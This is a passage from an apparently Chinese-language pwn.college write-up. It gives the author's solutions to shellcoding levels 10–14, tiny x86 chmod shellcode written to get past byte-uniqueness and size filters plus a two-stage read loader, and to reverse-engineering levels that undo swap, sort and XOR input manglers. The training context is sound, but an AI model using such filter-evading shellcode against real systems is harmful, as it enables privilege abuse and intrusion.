<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> *input = shellcode_mem;</span><br><span class="line"><span class="type">int</span> sort_max = shellcode_size / <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>) - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; sort_max; i++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; sort_max-i<span class="number">-1</span>; j++)</span><br><span class="line">        <span class="keyword">if</span> (input[j] &gt; input[j+<span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint64_t</span> x = input[j];</span><br><span class="line">            <span class="type">uint64_t</span> y = input[j+<span class="number">1</span>];</span><br><span class="line">            input[j] = y;</span><br><span class="line">            input[j+<span class="number">1</span>] = x;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>而我的shellcode只有13个字节，13&#x2F;8 &#x3D; 1。再减1就是0。那么就不会执行过滤器。所以我执行后就拿到了flag。它实际会将16个字节以上的shellcode进行排序。</p>
<h4 id="level11-1"><a href="#level11-1" class="headerlink" title="level11"></a>level11</h4><p>这道题是level10 加上删去读取stdin。可是使用chmod修改权限的shellcode压根就不需要stdin。网友还是厉害，想到了<code>chmod</code>这个方法。后面的几关都直接过了。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x61</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">4</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x5a</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<h4 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h4><p>This challenge requires that every byte in your shellcode is unique!</p>
<p>这一关需要每个字节是第一次使用，也就是没有重复的字节出现。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x61</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">bl</span>, <span class="number">0x4</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">esi</span>, <span class="built_in">ebx</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">0x5a</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>我居然一直不知道esi寄存器的存在，我以为只有a,b,c,d寄存器会有32位，16位，8位寄存器。</p>
<p>通用寄存器都有低至16位的寄存器。</p>
</blockquote>
<h4 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h4><p>限制shellcode为0xc个字节！上面的exp还能删减一下。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x61</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">esi</span>, <span class="number">0x4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">0x5a</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样就正好是0xc个字节。</p>
<h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h4><p>shellcode只能是6个字节，我靠。看看人家的wp做吧，没有什么思路。</p>
<p>发现得用当时的一些寄存器来达成目标。在调用我们的shellcode时，可以看到rax是0。并且</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">RAX</span>  <span class="number">0x0</span></span><br><span class="line"> <span class="built_in">RBX</span>  <span class="number">0x627f8b68e7e0</span> (__libc_csu_init) ◂— endbr64 </span><br><span class="line"> <span class="built_in">RCX</span>  <span class="number">0x766dd2e1e297</span> (write+<span class="number">23</span>) ◂— <span class="keyword">cmp</span> <span class="built_in">rax</span>, -<span class="number">01000h</span> /* <span class="string">&#x27;H=&#x27;</span> */</span><br><span class="line"> <span class="built_in">RDX</span>  <span class="number">0x26a69000</span> ◂— <span class="keyword">push</span> <span class="number">61h</span> /* <span class="number">0x83e78948616a</span> */</span><br><span class="line"> <span class="built_in">RDI</span>  <span class="number">0x766dd2efe7e0</span> (_IO_stdfile_1_lock) ◂— <span class="number">0x0</span></span><br><span class="line"> <span class="built_in">RSI</span>  <span class="number">0x766dd2efd723</span> (_IO_2_1_stdout_+<span class="number">131</span>) ◂— <span class="number">0xefe7e0000000000a</span> /* <span class="string">&#x27;\n&#x27;</span> */</span><br><span class="line"> <span class="built_in">R8</span>   <span class="number">0x16</span></span><br><span class="line"> <span class="built_in">R9</span>   <span class="number">0x10</span></span><br><span class="line"> <span class="built_in">R10</span>  <span class="number">0x627f8b68f113</span> ◂— <span class="number">0x525245000000000a</span> /* <span class="string">&#x27;\n&#x27;</span> */</span><br><span class="line"> <span class="built_in">R11</span>  <span class="number">0x246</span></span><br><span class="line"> <span class="built_in">R12</span>  <span class="number">0x627f8b68e200</span> (_start) ◂— endbr64 </span><br><span class="line"> <span class="built_in">R13</span>  <span class="number">0x7ffe2e2e5a80</span> ◂— <span class="number">0x1</span></span><br><span class="line"> <span class="built_in">R14</span>  <span class="number">0x0</span></span><br><span class="line"> <span class="built_in">R15</span>  <span class="number">0x0</span></span><br><span class="line"> <span class="built_in">RBP</span>  <span class="number">0x7ffe2e2e5990</span> ◂— <span class="number">0x0</span></span><br><span class="line">*<span class="built_in">RSP</span>  <span class="number">0x7ffe2e2e5948</span> —▸ <span class="number">0x627f8b68e7c3</span> (main+<span class="number">636</span>) ◂— <span class="keyword">lea</span> <span class="built_in">rdi</span>, [<span class="built_in">rip</span> + <span class="number">0cdah</span>]</span><br><span class="line">*<span class="built_in">RIP</span>  <span class="number">0x26a69000</span> ◂— <span class="keyword">push</span> <span class="number">61h</span> /* <span class="number">0x83e78948616a</span> */</span><br></pre></td></tr></table></figure>

<p>rax为0，那么就是read系统调用号。read系统调用的第一个参数rdi为文件描述符，需要为0。第二个参数rsi为读取存放的地址，这里应该就是rdx&#x2F;rdi都行。第三个参数rdx为0x26a6900为写入的字节数。</p>
<p>那么也就是需要重写rdi寄存器和rsi寄存器即可。stageone的代码：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">edi</span>, <span class="built_in">edi</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">esi</span>, <span class="built_in">edx</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>随后，把stagetwo的代码读入即可。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="meta">    .rept</span> <span class="number">0x10</span></span><br><span class="line">    <span class="keyword">nop</span></span><br><span class="line"><span class="meta">    .endr</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x61</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">esi</span>, <span class="number">0x4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">0x5a</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>需要一个填充，因为前六个字节也被覆盖了，因此执行只能从第七个字节开始。</p>
<p>最后的命令是<code>cat stageone-raw shellcode-raw | /challenge/babyshell_level14</code>。抽象的是，我在gdb里调试了半天，stageone的代码一直无法进行系统调用，我以为是代码的问题，实际上是权限不够，无法进行syscall。</p>
<h3 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h3><h4 id="level1-0"><a href="#level1-0" class="headerlink" title="level1.0"></a>level1.0</h4><p>这题很简单哇，就是把输入的字符串转成了ascii。对应输入即可获得flag</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Ready</span> to receive your license key!</span><br><span class="line"></span><br><span class="line"><span class="attribute">quit</span></span><br><span class="line"><span class="attribute">Initial</span> input:</span><br><span class="line"></span><br><span class="line">        <span class="attribute">71</span> <span class="number">75</span> <span class="number">69</span> <span class="number">74</span> <span class="number">0</span>a </span><br><span class="line"></span><br><span class="line"><span class="attribute">The</span> mangling is done! The resulting bytes will be used for the final comparison.</span><br><span class="line"></span><br><span class="line"><span class="attribute">Final</span> result of mangling input:</span><br><span class="line"></span><br><span class="line">        <span class="attribute">71</span> <span class="number">75</span> <span class="number">69</span> <span class="number">74</span> <span class="number">0</span>a </span><br><span class="line"></span><br><span class="line"><span class="attribute">Expected</span> result:</span><br><span class="line"></span><br><span class="line">        <span class="attribute">63</span> <span class="number">6</span>c <span class="number">6</span>a <span class="number">79</span> <span class="number">62</span> </span><br><span class="line"></span><br><span class="line"><span class="attribute">Checking</span> the received license key!</span><br></pre></td></tr></table></figure>

<h4 id="level1-1"><a href="#level1-1" class="headerlink" title="level1.1"></a>level1.1</h4><p>这下没有回显了，只能通过工具逆向一下子了。</p>
<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107202238497.png" class="" title="image-20241107202238497">

<p>也很简单啊，直接看到了匹配的字符串。</p>
<h4 id="level2-0"><a href="#level2-0" class="headerlink" title="level2.0"></a>level2.0</h4><p>依然，使用IDA 看看：</p>
<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107202710303.png" class="" title="image-20241107202710303">

<p>但是输入会把最后两个字节翻转。最后输入xzujs即可。</p>
<h4 id="level2-1"><a href="#level2-1" class="headerlink" title="level2.1"></a>level2.1</h4><p>依然是，没有回显。简单查看一下逆向出来的源码。</p>
<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107204303139.png" class="" title="image-20241107204303139">

<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+buf+<span class="number">2</span>]</span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+var_10], <span class="built_in">al</span></span><br><span class="line"><span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+buf+<span class="number">3</span>]</span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+var_10+<span class="number">1</span>], <span class="built_in">al</span></span><br><span class="line"><span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+var_10+<span class="number">1</span>]</span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+buf+<span class="number">2</span>], <span class="built_in">al</span></span><br><span class="line"><span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+var_10]</span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+buf+<span class="number">3</span>], <span class="built_in">al</span></span><br></pre></td></tr></table></figure>

<p>其中，<code>rbp+buf</code>是用户输入的地址。按照逻辑分析：该代码将用户输入的第3个字节给了<code>rbp+var_10</code>位置。第4个字节给了<code>rbp+var_10+1</code>位置，随后第4个字节给了第3个字节位置。第3个字节给了第4个字节位置。综合起来即，将用户输入的第三、四个字节位置交换。</p>
<p>那么输入<code>loodc</code>即可。</p>
<h4 id="level3-0"><a href="#level3-0" class="headerlink" title="level3.0"></a>level3.0</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">quit</span></span><br><span class="line"><span class="attribute">Initial</span> input:</span><br><span class="line"></span><br><span class="line">        <span class="attribute">71</span> <span class="number">75</span> <span class="number">69</span> <span class="number">74</span> <span class="number">0</span>a </span><br><span class="line"></span><br><span class="line"><span class="attribute">This</span> challenge is now mangling your input using the `reverse` mangler.</span><br><span class="line"></span><br><span class="line"><span class="attribute">This</span> mangled your input, resulting in:</span><br><span class="line"></span><br><span class="line">        <span class="attribute">0a</span> <span class="number">74</span> <span class="number">69</span> <span class="number">75</span> <span class="number">71</span> </span><br></pre></td></tr></table></figure>

<p>显然，这是将输入进行逆序了。<img src="/2025/03/01/pwn-college-题解/image-20241107210124444.png"  alt="image-20241107210124444" style="zoom:200%;" /></p>
<p>其实也不用IDA，通过回显的ASCII码可以推出要的结果。</p>
<p>最后输入<code>sikky</code>即可。</p>
<h4 id="level3-1"><a href="#level3-1" class="headerlink" title="level3.1"></a>level3.1</h4><p>查看源码：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">loc_153E:</span></span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">rbp</span>+var_14]</span><br><span class="line"><span class="keyword">cdqe</span></span><br><span class="line"><span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+<span class="built_in">rax</span>+buf]</span><br><span class="line"><span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_16], <span class="built_in">al</span></span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">4</span></span><br><span class="line"><span class="keyword">sub</span>     <span class="built_in">eax</span>, [<span class="built_in">rbp</span>+var_14]</span><br><span class="line"><span class="keyword">cdqe</span></span><br><span class="line"><span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+<span class="built_in">rax</span>+buf]</span><br><span class="line"><span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_15], <span class="built_in">al</span></span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">rbp</span>+var_14]</span><br><span class="line"><span class="keyword">cdqe</span></span><br><span class="line"><span class="keyword">movzx</span>   <span class="built_in">edx</span>, [<span class="built_in">rbp</span>+var_15]</span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+<span class="built_in">rax</span>+buf], <span class="built_in">dl</span></span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">4</span></span><br><span class="line"><span class="keyword">sub</span>     <span class="built_in">eax</span>, [<span class="built_in">rbp</span>+var_14]</span><br><span class="line"><span class="keyword">cdqe</span></span><br><span class="line"><span class="keyword">movzx</span>   <span class="built_in">edx</span>, [<span class="built_in">rbp</span>+var_16]</span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+<span class="built_in">rax</span>+buf], <span class="built_in">dl</span></span><br><span class="line"><span class="keyword">add</span>     [<span class="built_in">rbp</span>+var_14], <span class="number">1</span></span><br></pre></td></tr></table></figure>

<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107211657926.png" class="" title="image-20241107211657926">

<blockquote>
<p>cdqe指令：EAX符号位拓展到RAX</p>
</blockquote>
<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107212701406.png" class="" title="image-20241107212701406">

<p>有点抽象的是，无法知道[rbp+var_14]的值，因此手动分析不出来哇。通过IDA查看源码，发现循环了两次，第一次是交换第一个字节和第5个字节。第二次是交换第二个字节和第4个字节。因此就是一个逆序。</p>
<p>然后，<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107213541957.png" class="" title="image-20241107213541957"></p>
<p>最后输入<code>ruhsi</code>即可。</p>
<h4 id="level4-0"><a href="#level4-0" class="headerlink" title="level4.0"></a>level4.0</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">quit</span></span><br><span class="line"><span class="attribute">Initial</span> input:</span><br><span class="line"></span><br><span class="line">        <span class="attribute">71</span> <span class="number">75</span> <span class="number">69</span> <span class="number">74</span> <span class="number">0</span>a </span><br><span class="line"></span><br><span class="line"><span class="attribute">This</span> challenge is now mangling your input using the `sort` mangler.</span><br><span class="line"></span><br><span class="line"><span class="attribute">This</span> mangled your input, resulting in:</span><br><span class="line"></span><br><span class="line">        <span class="attribute">0a</span> <span class="number">69</span> <span class="number">71</span> <span class="number">74</span> <span class="number">75</span></span><br></pre></td></tr></table></figure>

<p>最后一个字节，去了第一个位置。第三个字节去了第二个位置，第一个字节去了第三个位置，第四个位置没动，第二个字节去了第五个位置。</p>
<p><code>66 71 72 77 78</code>，这是期待的字符串，也就是<code>fqrwx</code></p>
<p>最后输入<code>xrfwq</code>即可。</p>
<p>qfxwr</p>
<h4 id="level4-1"><a href="#level4-1" class="headerlink" title="level4.1"></a>level4.1</h4><p>这道题也是一样的，按照上面的逻辑进行翻转。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span> - i; ++j )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> ( *((_BYTE *)&amp;buf + j) &gt; *((_BYTE *)&amp;buf + j + <span class="number">1</span>) )</span><br><span class="line">     &#123;</span><br><span class="line">       v3 = *((_BYTE *)&amp;buf + j);</span><br><span class="line">       *((_BYTE *)&amp;buf + j) = *((_BYTE *)&amp;buf + j + <span class="number">1</span>);</span><br><span class="line">       *((_BYTE *)&amp;buf + j + <span class="number">1</span>) = v3;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>分析一下，i &#x3D; 0 的情况下，j由0到3，前五个字节。那么这里会有一个判断，即将ascii值最大的字节放至第5个位置；i &#x3D; 1的情况下，j由0到2，前4个字节。将ascii值最大的字节放至第4个位置。以此类推。这是冒泡排序，对前5个字节进行冒泡排序。将ascii码值由小到大排序。</p>
</blockquote>
<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107214343087.png" class="" title="image-20241107214343087">



<p>最后输入<code>almrv的任意排序</code>即可。因此，我在level4.0发现的规律是错误的。</p>
<h4 id="level5-0"><a href="#level5-0" class="headerlink" title="level5.0"></a>level5.0</h4><p>This challenge is now mangling your input using the <code>xor</code> mangler with key <code>0xb7</code></p>
<p>与0xb7异或。异或的操作是可逆的，那么再异或回去就好了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">0xc3</span> ^ <span class="number">0xb7</span></span><br><span class="line"><span class="number">116</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(<span class="number">0xc3</span> ^ <span class="number">0xb7</span>)</span><br><span class="line"><span class="string">&#x27;0x74&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(<span class="number">0xc2</span> ^ <span class="number">0xb7</span>)</span><br><span class="line"><span class="string">&#x27;0x75&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(<span class="number">0xdf</span> ^ <span class="number">0xb7</span>)</span><br><span class="line"><span class="string">&#x27;0x68&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(<span class="number">0xc7</span> ^ <span class="number">0xb7</span>)</span><br><span class="line"><span class="string">&#x27;0x70&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(<span class="number">0xc4</span> ^ <span class="number">0xb7</span>)</span><br><span class="line"><span class="string">&#x27;0x73&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure>

<p>用python终端，即可。最终输入<code>tuhps</code>即可。</p>
<h4 id="level5-1"><a href="#level5-1" class="headerlink" title="level5.1"></a>level5.1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    *((_BYTE *)&amp;buf + i) ^= <span class="number">0x41u</span>;</span><br></pre></td></tr></table></figure>

<p>异或的字节为0x41，目标字符串是<code>.data:0000000000004010 a056            db &#39;0&#39;,27h,27h,&#39;56&#39;,0</code></p>
<p>异或一下。最终输入<code>qfftw</code>即可。</p>
<h4 id="level6-0"><a href="#level6-0" class="headerlink" title="level6.0"></a>level6.0</h4><p>This challenge is now mangling your input using the <code>xor</code> mangler with key <code>0xbf46</code></p>
<p>This challenge is now mangling your input using the <code>sort</code> mangler.</p>
<p>This challenge is now mangling your input using the <code>swap</code> mangler for indexes <code>0</code> and <code>9</code>.</p>
<p>强度一下就上来啦，xor，sort和swap三种方法。</p>
<p>目标</p>
<p>字符串为：<code>cd 20 25 27 27 28 31 35 c8 20 ce cf d1 d5 d9 dc</code>，写个脚本跑就好了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/challenge/babyrev_level6.0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 20 20 25 27 27 28 31 35 c8 cd ce cf d1 d5 d9 dc</span></span><br><span class="line">hex_string=[<span class="number">0x20</span>,<span class="number">0x20</span>,<span class="number">0x25</span>,<span class="number">0x27</span>,<span class="number">0x27</span>,<span class="number">0x28</span>,<span class="number">0x31</span>,<span class="number">0x35</span>,<span class="number">0xc8</span>,<span class="number">0xcd</span>,<span class="number">0xce</span>,<span class="number">0xcf</span>,<span class="number">0xd1</span>,<span class="number">0xd5</span>,<span class="number">0xd9</span>,<span class="number">0xdc</span>]</span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># xor</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(hex_string) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    payload += <span class="built_in">chr</span>(hex_string[i] ^ <span class="number">0xbf</span>)</span><br><span class="line">    payload += <span class="built_in">chr</span>(hex_string[i+<span class="number">1</span>] ^ <span class="number">0x46</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">data = io.recvall()</span><br><span class="line"><span class="built_in">print</span>(data.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>因为有sort的关系，并且最终的结果也确实sort后swap就能达到。因此只需要将目标字符串从小到大排序后，异或0xbf46即可。</p>
</blockquote>
<h4 id="level6-1"><a href="#level6-1" class="headerlink" title="level6.1"></a>level6.1</h4><p><strong><img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241108212052627.png" class="" title="image-20241108212052627"></strong></p>
